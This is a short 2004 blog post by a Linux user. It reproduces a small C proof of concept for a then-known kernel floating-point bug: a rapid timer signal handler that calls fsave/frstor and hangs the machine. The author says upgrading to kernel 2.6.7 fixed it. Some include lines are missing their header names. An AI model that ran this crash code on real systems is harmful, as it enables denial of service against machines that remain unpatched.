---
date: 2004-06-29 20:56:12
title: less than 30 lines of code that crashed linux
tags: Linux Unix QNX
---
yea yea, we all know about that stupid linux kernel bug that would allow a
program to crash the operating system.

it affected the floating point unit or something...  
as soon as I read about it, I tried it on my machine the night I got home,
and... it does hang my computer quite well

~~~ {.c}
#include 
#include 
#include 
 
static void Handler(int ignore)
{
    char fpubuf[108];
    __asm__ __volatile__ ("fsave %0n" : : "m"(fpubuf));
    write(2, "*", 1);
    __asm__ __volatile__ ("frstor %0n" : : "m"(fpubuf));
}
 
int main(int argc, char *argv[])
{
    struct itimerval spec;
    signal(SIGALRM, Handler);
    spec.it_interval.tv_sec=0;
    spec.it_interval.tv_usec=100;
    spec.it_value.tv_sec=0;
    spec.it_value.tv_usec=100;
    setitimer(ITIMER_REAL, &spec;, NULL);
    while(1)
        write(1, ".", 1);
    
    return 0;
}
~~~

last weekend I finally took the time to update my kernel to 2.6.7...  
after applying all the patches I wanted myself, I sort of have a working kernel
but no bootsplash :(

no cool load screen, but it did get rid of the above kernel bug...  
I'll just wait for new -love to come out I guess.
